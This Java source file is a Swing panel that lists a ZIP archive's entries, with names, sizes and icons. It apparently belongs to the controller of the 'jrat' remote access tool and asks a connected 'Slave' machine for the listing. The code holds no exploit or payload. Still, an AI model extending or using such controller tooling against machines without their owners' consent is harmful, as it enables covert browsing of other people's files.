package jrat.module.fs.ui.previews;

import iconlib.FileIconUtils;
import jrat.api.Resources;
import jrat.api.Resources;
import jrat.common.utils.DataUnits;
import jrat.controller.Slave;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;
import jrat.controller.ui.renderers.table.IconRenderer;
import jrat.module.fs.packets.Packet63PreviewArchive;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.zip.ZipEntry;


@SuppressWarnings("serial")
public class PanelPreviewArchive extends PreviewPanel<ZipEntry> {

	private JTable table;
	private TableModel model;
	private String file;

	private IconRenderer renderer = new IconRenderer();

	public PanelPreviewArchive(Slave s, String f) {
		super(s, "Archive Preview - " + f, Resources.getIcon("archive"));

		this.file = f;

		setLayout(new BorderLayout(0, 0));

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		table = new DefaultJTable();
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "File name", "Size" }) {
			public boolean isCellEditable(int row, int column) {
				return false;
			}
		});
		table.setDefaultRenderer(Object.class, renderer);

		table.setRowHeight(30);
		scrollPane.setViewportView(table);

		add(scrollPane, BorderLayout.CENTER);

		reload();
	}

    /**
     * Add a zip entry to the table
     */
	public void addData(ZipEntry entry) {
	    String name = entry.getName();
        String size = "";

        if (!entry.isDirectory()) {
            size = DataUnits.getAsString(entry.getSize());
        }

        Icon icon = FileIconUtils.getIconFromExtension(name, entry.isDirectory());
        renderer.icons.put(model.getRowCount(), icon);

        model.addRow(new Object[] { name, size });
    }

	private void reload() {
		slave.addToSendQueue(new Packet63PreviewArchive(file));
	}
}
